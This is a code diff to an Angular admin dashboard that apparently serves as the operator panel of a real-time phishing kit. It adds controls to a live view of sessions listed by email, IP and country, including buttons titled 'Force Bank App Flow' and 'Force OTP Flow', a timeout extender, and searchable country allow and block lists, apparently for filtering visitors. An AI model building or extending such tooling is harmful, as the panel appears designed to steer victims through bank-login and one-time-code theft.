@@ -7,6 +7,7 @@ import { AuthService } from '../services/auth.service';
 import { ModalService } from '../services/modal.service';
 import { TranslationService } from '../services/translation.service';
 import { TranslatePipe } from '../pipes/translate.pipe';
+import { COUNTRIES } from '../utils/country-data';
 
 type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
 
@@ -218,10 +219,20 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                                     <img [src]="getFlagUrl(session.data.ipCountry)" class="h-3 w-auto rounded-[2px]">
                                                 }
                                              </div>
-                                             <div class="flex items-center justify-between w-full">
-                                                <span class="text-sm font-bold text-slate-700 dark:text-slate-300 truncate">{{ getDisplayEmail(session.email) }}</span>
+                                             <div class="flex items-center justify-between w-full relative">
+                                                <span class="text-sm font-bold text-slate-700 dark:text-slate-300 truncate max-w-[140px]">{{ getDisplayEmail(session.email) }}</span>
+
+                                                <div class="flex items-center gap-1 absolute right-0 bottom-0 bg-white/80 dark:bg-slate-700/80 pl-2 backdrop-blur-sm opacity-0 group-hover:opacity-100 transition-opacity" (click)="$event.stopPropagation()">
+                                                    <button (click)="state.pinSession(session.id)" class="text-slate-400 hover:text-pp-blue" [class.text-pp-blue]="session.isPinned">
+                                                        <span class="material-icons text-[14px]">push_pin</span>
+                                                    </button>
+                                                    <button (click)="state.deleteSession(session.id)" class="text-slate-400 hover:text-red-500">
+                                                        <span class="material-icons text-[14px]">delete</span>
+                                                    </button>
+                                                </div>
+
                                                 @if(getActionBadge(session)) {
-                                                    <span class="bg-red-500 text-white text-[9px] font-bold px-1.5 py-0.5 rounded animate-pulse ml-2 whitespace-nowrap">
+                                                    <span class="bg-red-500 text-white text-[9px] font-bold px-1.5 py-0.5 rounded animate-pulse ml-2 whitespace-nowrap group-hover:opacity-0 transition-opacity">
                                                         {{ getActionBadge(session) }}
                                                     </span>
                                                 }
@@ -515,7 +526,9 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                             <input type="checkbox" (change)="toggleAllSelection($event)" [checked]="isAllSelected()" class="rounded border-slate-300 text-pp-blue focus:ring-pp-blue cursor-pointer">
                                         </th>
                                         <th class="px-4 py-4">Time</th>
+                                        <th class="px-4 py-4">Country</th>
                                         <th class="px-6 py-4">IP Address</th>
+                                        <th class="px-4 py-4">Device</th>
                                         <th class="px-6 py-4">Identity</th>
                                         <th class="px-6 py-4">Status</th>
                                         <th class="px-6 py-4 text-right">Actions</th>
@@ -528,7 +541,15 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                                 <input type="checkbox" [checked]="selectedSessionIds().has(item.id)" (change)="toggleSelection(item.id, $event)" class="rounded border-slate-300 dark:border-slate-500 text-pp-blue focus:ring-pp-blue cursor-pointer">
                                             </td>
                                             <td class="px-4 py-4 text-slate-500 dark:text-slate-400 whitespace-nowrap">{{ item.timestamp | date:'short' }}</td>
+                                            <td class="px-4 py-4">
+                                                @if(item.data?.ipCountry) {
+                                                    <img [src]="getFlagUrl(item.data.ipCountry)" class="h-4 w-auto rounded shadow-sm" title="{{item.data.ipCountry}}">
+                                                }
+                                            </td>
                                             <td class="px-6 py-4 text-pp-blue dark:text-blue-400 font-bold font-mono">{{ item.ip || item.fingerprint.ip }}</td>
+                                            <td class="px-4 py-4 text-slate-500">
+                                                <span class="material-icons text-[16px]">{{ getDeviceIcon(item.fingerprint?.userAgent) }}</span>
+                                            </td>
                                             <td class="px-6 py-4 dark:text-white">{{ item.email }}</td>
                                             <td class="px-6 py-4"><span class="bg-green-100 text-green-700 px-3 py-1 rounded-full text-[11px] font-bold uppercase">{{ item.status }}</span></td>
                                             <td class="px-6 py-4 text-right"><button (click)="exportTxt(item)" class="text-pp-blue font-bold text-xs hover:underline">Export</button></td>
@@ -611,11 +632,20 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                              </span>
                                          }
                                      </div>
-                                     <div class="flex gap-2">
-                                         <select #allowSelect class="pp-input py-1 text-sm dark:bg-slate-700 dark:text-white dark:border-slate-600">
-                                             <option *ngFor="let c of countryList" [value]="c.code">{{ c.name }}</option>
-                                         </select>
-                                         <button (click)="addCountry('allowed', allowSelect.value)" class="pp-btn w-auto px-4 py-1 text-xs">Add</button>
+                                     <div class="relative">
+                                         <div class="pp-input-group mb-0 cursor-pointer" (click)="toggleAllowedDropdown()">
+                                             <input type="text" [ngModel]="allowedSearch()" (ngModelChange)="allowedSearch.set($event)" placeholder="Search to add..." class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
+                                             <span class="material-icons absolute right-3 top-3 text-slate-400">add</span>
+                                         </div>
+                                         @if(showAllowedDropdown()) {
+                                             <div class="absolute w-full bg-white dark:bg-slate-800 border border-slate-200 dark:border-slate-600 rounded-lg shadow-xl mt-1 z-50 max-h-48 overflow-y-auto">
+                                                 @for(c of filteredAllowedCountries(); track c.code) {
+                                                     <div (click)="selectCountryToAdd('allowed', c.code)" class="px-4 py-2 hover:bg-slate-50 dark:hover:bg-slate-700 cursor-pointer text-sm dark:text-white">
+                                                         {{ c.name }} ({{c.code}})
+                                                     </div>
+                                                 }
+                                             </div>
+                                         }
                                      </div>
                                  </div>
 
@@ -630,11 +660,20 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                              </span>
                                          }
                                      </div>
-                                     <div class="flex gap-2">
-                                         <select #blockSelect class="pp-input py-1 text-sm dark:bg-slate-700 dark:text-white dark:border-slate-600">
-                                             <option *ngFor="let c of countryList" [value]="c.code">{{ c.name }}</option>
-                                         </select>
-                                         <button (click)="addCountry('blocked', blockSelect.value)" class="pp-btn w-auto px-4 py-1 text-xs">Add</button>
+                                     <div class="relative">
+                                         <div class="pp-input-group mb-0 cursor-pointer" (click)="toggleBlockedDropdown()">
+                                             <input type="text" [ngModel]="blockedSearch()" (ngModelChange)="blockedSearch.set($event)" placeholder="Search to add..." class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
+                                             <span class="material-icons absolute right-3 top-3 text-slate-400">add</span>
+                                         </div>
+                                         @if(showBlockedDropdown()) {
+                                             <div class="absolute w-full bg-white dark:bg-slate-800 border border-slate-200 dark:border-slate-600 rounded-lg shadow-xl mt-1 z-50 max-h-48 overflow-y-auto">
+                                                 @for(c of filteredBlockedCountries(); track c.code) {
+                                                     <div (click)="selectCountryToAdd('blocked', c.code)" class="px-4 py-2 hover:bg-slate-50 dark:hover:bg-slate-700 cursor-pointer text-sm dark:text-white">
+                                                         {{ c.name }} ({{c.code}})
+                                                     </div>
+                                                 }
+                                             </div>
+                                         }
                                      </div>
                                  </div>
 
@@ -977,9 +1016,12 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                     </div>
                 </div>
                 @if(!isHistory) {
-                    <div class="text-right">
+                    <div class="text-right flex flex-col items-end">
                         <p class="text-[10px] text-slate-400 font-bold uppercase">{{ 'TIME_ELAPSED' | translate }}</p>
-                        <p class="font-mono font-bold text-pp-blue">{{ elapsedTime() }}</p>
+                        <div class="flex items-center gap-2">
+                            <p class="font-mono font-bold text-pp-blue">{{ elapsedTime() }}</p>
+                            <button (click)="extendTimeout(60000)" class="text-[10px] bg-blue-50 text-pp-blue px-2 py-0.5 rounded hover:bg-blue-100 font-bold border border-blue-100 transition-colors" title="Add 1 Minute">+1m</button>
+                        </div>
                     </div>
                 }
             </div>
@@ -1108,13 +1150,26 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
             </div>
 
             @if(!isHistory) {
-                <div class="p-5 border-t border-slate-200 dark:border-slate-700 bg-white dark:bg-slate-800 sticky bottom-0 z-20 flex justify-between items-center shadow-lg lg:shadow-none">
-                    <div class="flex items-center gap-2">
-                        <span class="h-2 w-2 rounded-full" [class.animate-pulse]="isSessionLive(session)" [class.bg-pp-success]="isSessionLive(session)" [class.bg-slate-300]="!isSessionLive(session)"></span>
-                        <span class="text-xs font-bold text-slate-500 hidden sm:block">{{ isSessionLive(session) ? 'Live Connection' : 'Offline' }}</span>
+                <div class="p-5 border-t border-slate-200 dark:border-slate-700 bg-white dark:bg-slate-800 sticky bottom-0 z-20 flex flex-col md:flex-row justify-between items-center gap-4 shadow-lg lg:shadow-none">
+                    <div class="flex items-center gap-4 w-full md:w-auto">
+                        <div class="flex items-center gap-2">
+                            <span class="h-2 w-2 rounded-full" [class.animate-pulse]="isSessionLive(session)" [class.bg-pp-success]="isSessionLive(session)" [class.bg-slate-300]="!isSessionLive(session)"></span>
+                            <span class="text-xs font-bold text-slate-500 hidden sm:block">{{ isSessionLive(session) ? 'Live' : 'Offline' }}</span>
+                        </div>
+
+                        <!-- Bank Flow Options -->
+                        <div class="flex items-center gap-1 bg-slate-100 dark:bg-slate-700/50 p-1 rounded-lg">
+                            <button (click)="requestFlow('app')" class="p-2 rounded hover:bg-white dark:hover:bg-slate-600 text-slate-500 hover:text-pp-blue transition-all" title="Force Bank App Flow">
+                                <span class="material-icons text-lg">touch_app</span>
+                            </button>
+                            <button (click)="requestFlow('otp')" class="p-2 rounded hover:bg-white dark:hover:bg-slate-600 text-slate-500 hover:text-pp-blue transition-all" title="Force OTP Flow">
+                                <span class="material-icons text-lg">sms</span>
+                            </button>
+                        </div>
                     </div>
+
                     @if(monitoredSession()) {
-                        <div class="flex gap-3">
+                        <div class="flex gap-3 w-full md:w-auto justify-end">
                             <button (click)="revoke()"
                                     [disabled]="!session?.isLoginVerified"
                                     [class.opacity-50]="!session?.isLoginVerified"
@@ -1204,17 +1259,25 @@ export class AdminDashboardComponent implements OnInit {
   countdownSeconds = signal<number | null>(null);
   private timer: number | undefined;
 
-  countryList = [
-      { code: 'US', name: 'United States' },
-      { code: 'GB', name: 'United Kingdom' },
-      { code: 'CA', name: 'Canada' },
-      { code: 'AU', name: 'Australia' },
-      { code: 'FR', name: 'France' },
-      { code: 'DE', name: 'Germany' },
-      { code: 'IT', name: 'Italy' },
-      { code: 'ES', name: 'Spain' },
-      { code: 'JP', name: 'Japan' }
-  ];
+  countryList = COUNTRIES;
+
+  // Country Selector UI State
+  allowedSearch = signal('');
+  blockedSearch = signal('');
+  showAllowedDropdown = signal(false);
+  showBlockedDropdown = signal(false);
+
+  filteredAllowedCountries = computed(() => {
+      const q = this.allowedSearch().toLowerCase();
+      if (!q) return this.countryList;
+      return this.countryList.filter(c => c.name.toLowerCase().includes(q));
+  });
+
+  filteredBlockedCountries = computed(() => {
+      const q = this.blockedSearch().toLowerCase();
+      if (!q) return this.countryList;
+      return this.countryList.filter(c => c.name.toLowerCase().includes(q));
+  });
 
   filteredAdmins = computed(() => { const q = this.assignSearch().toLowerCase(); return this.userList().filter(u => u.username.toLowerCase().includes(q)); });
   canInteract = computed(() => { const s = this.monitoredSession(); return s?.currentView === 'loading'; });
@@ -1359,6 +1422,24 @@ export class AdminDashboardComponent implements OnInit {
       if (!this.flowSettings[key].includes(code)) {
           this.flowSettings[key].push(code);
       }
+  }
+
+  toggleAllowedDropdown() {
+      this.showAllowedDropdown.update(v => !v);
+      this.showBlockedDropdown.set(false);
+  }
+
+  toggleBlockedDropdown() {
+      this.showBlockedDropdown.update(v => !v);
+      this.showAllowedDropdown.set(false);
+  }
+
+  selectCountryToAdd(type: 'allowed' | 'blocked', code: string) {
+      this.addCountry(type, code);
+      this.showAllowedDropdown.set(false);
+      this.showBlockedDropdown.set(false);
+      this.allowedSearch.set('');
+      this.blockedSearch.set('');
   }
 
   removeCountry(type: 'allowed' | 'blocked', code: string) {
